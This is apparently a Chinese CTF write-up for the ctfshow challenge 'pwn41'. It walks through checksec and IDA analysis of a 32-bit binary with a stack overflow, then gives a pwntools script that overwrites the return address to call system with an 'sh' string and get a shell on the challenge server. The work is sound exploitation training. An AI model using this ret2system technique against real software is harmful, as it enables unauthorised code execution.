```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn41
```

```\
tasike@tasike-VM:~/Desktop$ file pwn41
pwn41: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e3acbdde8a861c0955c7d26c8d2a37afae1d0af2, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn41
[*] '/home/tasike/Desktop/pwn41'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

32bit，堆栈不可执行

`ida`查看：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  logo(&argc);
  ctfshow();
  puts("\nExit");
  return 0;
}
```

跟进`ctfshow`

```c
ssize_t ctfshow()
{
  char buf[14]; // [esp+6h] [ebp-12h] BYREF

  return read(0, buf, 0x32u);
}
```

> `buf`与`ebp`距离`0x12`

没有后门函数，但是有`_system`

```c
// attributes: thunk
int system(const char *command)
{
  return system(command);
}
```

`Fn +  Shift + F12`查看字符串，发现没有`/bin/sh`字符串

但是发现函数`useful`里有`sh`
```c
int useful()
{
  return printf("sh");
}
```

跟进`sh`

```
.rodata:080487BA 73 68 00                      aSh db 'sh',0
```



编写`attack41.py`

```python 
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28251)
system = 0x080483d0
sh = 0x080487BA
payload = cyclic(0x12 + 0x4) + p32(system) + p32(0) + p32(sh)
r.sendline(payload)
r.interactive()
```



